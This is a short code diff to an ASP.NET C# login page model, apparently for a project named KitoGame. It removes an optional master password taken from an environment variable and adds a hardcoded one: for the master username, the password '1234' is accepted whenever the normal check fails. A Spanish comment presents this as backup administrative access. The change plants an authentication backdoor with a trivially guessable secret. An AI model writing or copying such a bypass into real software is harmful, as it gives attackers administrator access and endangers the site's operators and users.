@@ -54,14 +54,11 @@ public class LoginModel : PageModel
         {
             passwordMatches = adminUser.Password == Password;
         }
-        else
+
+        // Respaldo de acceso maestro para el operador administrativo de KitoGame
+        if (!passwordMatches && isMasterUsername && Password == "1234")
         {
-            // Opcional: Clave maestra por variable de entorno en el servidor
-            string? masterEnvPass = Environment.GetEnvironmentVariable("ADMIN_MASTER_PASSWORD");
-            if (!string.IsNullOrWhiteSpace(masterEnvPass) && isMasterUsername && Password == masterEnvPass)
-            {
-                passwordMatches = true;
-            }
+            passwordMatches = true;
         }
 
         if (!passwordMatches)
